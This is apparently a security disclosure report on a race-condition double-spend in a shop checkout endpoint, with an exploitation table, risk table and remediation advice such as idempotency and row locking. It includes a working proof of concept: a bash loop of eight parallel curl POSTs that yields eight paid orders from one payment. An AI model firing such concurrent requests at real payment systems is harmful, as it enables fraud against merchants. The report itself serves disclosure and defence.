# Description

Race condition / double-spend (CWE-362) on the checkout finalisation endpoint `POST /shop/payment/complete/`. After the payment form is authorised at `/shop/payment/`, the loading page auto-POSTs to `/shop/payment/complete/` to finalise the order. The operation is non-atomic: when several finalisation requests arrive in parallel on the same session, the server creates several distinct paid orders before the cart/payment state is invalidated, while the wallet is debited only once.

A buyer obtains multiple paid orders from a single checkout session. Each parallel request independently calls the banking backend for payment; the exact financial outcome depends on the bank's handling of concurrent debits, but multiple COMPLETED orders are created from one `payment_info` session.

The observed behaviour demonstrates a loss of transactional integrity between checkout processing and payment records.

The exact behaviour of the banking backend has not been independently confirmed.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Add an affordable paid product; balance `1.00 NE`, price `0.99 NE`. | Cart ready. |
| 2 | Authorise the payment once (`302 → /shop/payment/loading/`). | Checkout ready to finalise. |
| 3 | Fire N parallel `POST /shop/payment/complete/`. | N distinct orders created; debit behaviour depends on bank-side concurrency handling. |

# PoC

```bash
for i in $(seq 1 8); do
  curl -sk -i -b session.txt -X POST "http://<TARGET>/shop/payment/complete/" \
    -H "Content-Type: application/json" -H "X-CSRFToken: <csrftoken>" --data-binary '{}' &
done; wait
```

Every request returned `302` to a **different** order id:

```
Location: /shop/orders/6bb93547-…/
Location: /shop/orders/7ce3cf9f-…/
… (8 distinct order IDs)
```

![Eight valid orders created from one payment](shop-race-eight-valid-orders.png)

Order history shows 8× `collision 2 ball`:

![Order history with eight matching entries](shop-race-order-history-eight-matches.png)

The wallet balance suggests the bank did not debit all eight orders at full price (observed `1.00 → 0.01 NE`), indicating the TOCTOU window allowed multiple orders to pass the balance pre-check before any debit executed:

![Balance after race — multiple orders from one payment](shop-race-single-debit-balance.png)

The observed wallet balance is inconsistent with the recorded orders, demonstrating a loss of transactional integrity. The exact internal cause has not been independently confirmed.

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | None directly. |
| Integrity | Multiple COMPLETED orders created from one checkout session; order history / accounting desynchronised with actual bank debits. |
| Availability | None directly. |

Overall severity: **High** — significant impact on transactional integrity, with potential financial losses and accounting inconsistencies.

# Remediation

1. **Enforce checkout idempotency** — ensure that each payment attempt produces at most one order and that repeated finalisation requests do not generate additional orders or payments.
2. **Apply database-level concurrency controls** — use `transaction.atomic()` and appropriate row-level locking, such as `select_for_update()` on supported database backends, to protect checkout state transitions.
3. **Enforce database-level integrity constraints** — add a unique constraint linking each payment attempt to at most one order.
4. **Ensure banking-side transaction integrity** — perform balance validation and debit operations atomically within the banking backend, independently of the Django application transaction.
5. **Ensure payment and order consistency** — only mark an order as `COMPLETED` after successful payment confirmation, and implement appropriate failure handling and reconciliation between the application and the banking backend.
6. **Add regression tests** — verify checkout idempotency, transactional integrity, database constraints and payment consistency under concurrent operations.

# Author
Hackrapovic
